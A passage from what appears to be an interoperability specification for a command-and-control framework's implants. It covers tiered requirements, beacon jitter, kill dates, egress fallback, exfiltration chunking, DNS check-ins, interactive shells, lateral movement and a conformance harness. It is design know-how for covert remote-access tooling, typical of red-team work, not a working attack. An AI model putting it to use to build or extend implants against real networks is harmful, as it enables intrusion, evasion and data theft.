    # stream mode: the while loop blocks on the next downstream frame.
    # poll mode: after a short idle with no frame, close the stream,
    # sleep(baked_sleep +/- baked_jitter/2), and reconnect.
```

An implant that stops here interoperates fully: it appears on the roster, is
taskable, and its results and audit trail are indistinguishable from the
reference implant's.

## Tier 1 -- Hardening (the implant author's choice)

Each item hardens the implant with no server-side counterpart requirement --
the server cannot observe whether an implant adopted any of them:

- **Tasking signature verification.** As specified above. Skipping it leaves
  the implant trusting the channel (the pre-signing posture,
  architecture.md Sec 9).
- **Replay nonces.** The negotiated arm above: advertise at the handshake,
  verify the five-element tuple, and refuse any nonce at or below your
  accepted floor, so a captured frame replayed to this implant is refused and
  the refusal surfaces on the task. The reference implant always advertises;
  skipping the arm leaves replay protection to the channel.
- **Kill date.** Refuse to start past the baked kill date and re-check it
  each cycle. The teamserver refuses handshakes past it regardless; the local
  check bounds a lost implant that can no longer reach any server.
- **Beacon discipline.** The baked sleep with jitter, and exponential backoff
  on consecutive failures, so a down teamserver is not polled at beacon rate.
  The check-in mode is the implant's choice on the same stream contract.
- **Egress fallback walk.** The baked profile may carry an ordered endpoint
  list -- a primary plus fallbacks (`fallbackEnrollURLs` in the baked JSON,
  `[]` when the build names none). Walk it on failure: advance to the next
  entry when an enroll attempt or a check-in cycle fails without a handshake,
  and wrap to the primary so a front that returns is picked up again. The walk
  is client-side only -- the frame grammar never changes -- and the leaf stays
  the same whichever entry answers, so the server sees one identity
  (architecture.md Sec 8).

## Tier 2 -- Optional features

Adopt per deployment need; absence degrades the feature, not interop:

- **Exfil chunking** -- `ExfilChunk` frames stream bulk data into the
  artifact store.
- **Staged uploads** -- the `StagedPull`/`StagedChunk` demand path streams a
  staged task's bulk payload downstream (architecture.md Sec 10, the
  per-verb typed arm). An implant without it still receives staged tasks;
  it ignores the unknown `staged_bytes` field and fails the verb on its own
  argument grammar, and no chunk frame ever arrives unasked.
- **Interactive channels** -- the `shell.interact` streaming shape above
  (architecture.md Sec 10.3): `ChannelOutput` upstream, `ChannelInput`
  downstream, one final `TaskResult`. An implant without it reports
  `shell.interact` Failed on its own grammar ("unknown verb" or a one-shot
  refusal), and the server never routes a `ChannelInput` to an implant that
  did not advertise the verb.
- **Receive acks** -- the dispatch strand above (architecture.md Sec 10.3):
  the `task_acks` handshake advertisement and the `TaskAck` frame. An
  implant without it never advertises, never acks, and keeps today's
  dispatch semantics exactly -- a written frame counts as delivered.
- **DNS check-ins** -- the TXT-query grammar above, for egress-restricted
  targets where only DNS leaves the network. Absence is graceful: an implant
  without it simply beacons over the stream transports. The reference
  implant carries the client: a `dns://` entry in its baked egress walk
  runs it (a named DNS beacon or a dns-schemed fallback), a build with no
  dns-schemed entry compiles without it.
- **Malleable enroll presentation** -- the baked URI path, User-Agent,
  headers, timeout, and base64 body envelope shape the enroll request.
- **Child derivation** -- the parent-naming enroll flow behind
  `lateral.move` (architecture.md Sec 5.2).

## Evolution rules

These rules bind every future protocol change; they are what keeps Tier 0
from quietly growing:

1. **Additive only.** New fields take new field numbers; numbers are never
   reused or repurposed. Unknown fields and enum values are ignored, never
   errors. A newer server must serve a Tier 0 implant unchanged.
2. **No new mandatory work on the task path.** A protocol addition that
   would require every implant to implement new cryptography or new
   processing to keep interoperating must instead be negotiated (a handshake
   capability) with a fallback to the existing shape, or it does not ship.
3. **Every addition lands in a tier.** A change to this file accompanies any
   change to rod.proto: the change states its tier and what a Tier 0 implant
   does about it (the usual answer: nothing). The staged-upload arm
   (`TaskRequest.staged_bytes`, `StagedPull`, `StagedChunk`) is the worked
   example: Tier 2, negotiated implicitly by demand -- a Tier 0 implant
   ignores the unknown field, never receives a chunk frame, and fails the
   verb on its own grammar. The fronting arm
   (`TaskRequest.target_implant_id`) follows the same rule: Tier 2, present
   only on frames a server fronts to a fronting-capable implant -- every
   other implant never sees the field at all.
4. **Weight stays server-side.** Capability reach grows in the teamserver,
   the tradecraft modules, and the build pipeline -- not in the minimum an
   implant must carry (architecture.md Sec 14).

## Conformance harness

The Tier 0 contract is executable, not just documented: the conformance
harness (`tests/teamserver/Rod.Conformance.Tests/`) drives a candidate
implant against a live teamserver and reports pass/fail per clause --
`enroll.public-key-and-token`, `handshake.first-frame-ok`, `task.round-trip`,
`chunk.discipline`, `signature.verification` (against a hostile tasking probe
that feeds unsigned, wrongly signed, cross-implant, and correctly signed
control tasks), and `kill-date.refusal`. Pointing it at the reference implant
passes every clause; pointing it at a deliberately broken one fails with the
violated clause named. A community implant author reproduces the shape:
implement `IImplantCandidate` (a process or an in-process loop) and hand it
to `ConformanceRig.RunAsync` -- the rig's own `MinimalImplant` is a worked
Tier 0/Tier 1 example with switchable defects.

## Calibration note

Tier 0's heaviest piece used to be the gRPC/HTTP-2 channel, not the crypto or
the messages. The plain-HTTP envelope check-in (above) shipped as the answer:
the same rod.v1 frames carried as delimited sequences in ordinary HTTP
request/response bodies, one POST per poll check-in, so Tier 0 now needs only
an HTTP client, a protobuf codec, and AES-256-GCM. Authentication moved to
the application layer with it: the build bakes a per-artifact key, every
check-in body seals under it covering a fresh counter, and the web transports
request no TLS client certificate at all -- so a Tier 0 implant also needs no
TLS client-certificate machinery on the web front, and the cleartext `http`
posture carries confidential content. The
gRPC stream remains the interactive shape -- server-push tasking the moment
it is queued, and the live channels -- so an implant that wants
`shell.interact` still wants the stream; an implant that only polls has no
reason to carry a gRPC stack at all.

The reference .NET implant made the same cut: an artifact built against an
`http`/`https` front with no beacon named checks in over the envelope POST
cycle on that front's own port (the mainstream single-port web shape), and
only an mTLS-shaped build dials the gRPC stream -- so the wire contract this
document describes is the one the reference implant itself runs on the web
transports.
